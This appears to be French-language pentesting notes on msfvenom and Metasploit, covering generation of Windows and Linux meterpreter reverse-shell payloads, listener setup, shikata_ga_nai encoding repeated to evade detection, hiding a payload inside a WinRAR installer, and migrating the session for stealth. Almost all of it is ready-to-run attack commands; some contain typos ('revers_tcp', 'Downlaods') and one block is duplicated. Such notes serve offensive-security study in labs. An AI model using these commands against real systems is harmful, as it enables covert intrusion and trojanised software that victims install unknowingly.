

`msfvenom --list payload` permet de lister tous le spayloads dispos :
`windows/x64/meterpreter/reverse_tcp` classique utilisé pour Windows 64 bits. (c'est un staged payload)  
`windows/x64/meterpreter_reverse_http` est un non staged payload  

### Générer un payload  
**Payload Windows :**  
`msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -f exe > /home/kali/Desktop/Windows_Payloads/payloadx86.exe` : crée un payload d'architecture 32 bits, de type windows tcp, machine d'écoute et son port, puis on spécifie le format (-f) exe (car on eut un executable) que l'on exporte au chemin spécifié en .exe (important).  

`msfvenom --list formats` : formats d'exportation possibles.  


**Payload avec Linux :**  
`msfvenom -p linux/x86/meterpreter/revers_tcp LHOST=10.10.10.5 LPORT=1234 -f elf > ~/Desktop/Linux_Payloads/payloadx86` : Une fois le payload généré il faut modifier les droits (`chmod +x payloadx86`)  


### Dans Metasploit  
`use multi/handler`  
`set payload windows/meterpreter/reverse_tcp`  
Puis paramétrer la machine d'écoute : LHOST, LPORT et run.  


## Encodage

`msfvenom --list encoders`  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload : un encodeur polymorphe il change la forme du code à chaque fois mais pas ce qu'il fait.  

mais pas ce qu’il fait  

`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload avec 10 itérations pour fuir la détection des FW.  


## Injection de Payload dans un exécutable Windows
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downlaods/wrar602.exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload pour Windows 32 bits avec 10 itérations et le cache dans un exécutable, ici winrar.  

Une fois le meterpreter lancé, il est intéressant de lancer `run post/windows/manage/migrate` Ce module sert à déplacer une session Metasploit vers un autre processus Windows pour la rendre plus stable ou discrète.  


`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.5 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe -x ~/Downlaods/wrar602.exe > /home/kali/Desktop/Windows_Payloads/encodedx86.exe` : encode le payload pour Windows 32 bits avec 10 itérations et le cache dans un exécutable, ici winrar.  

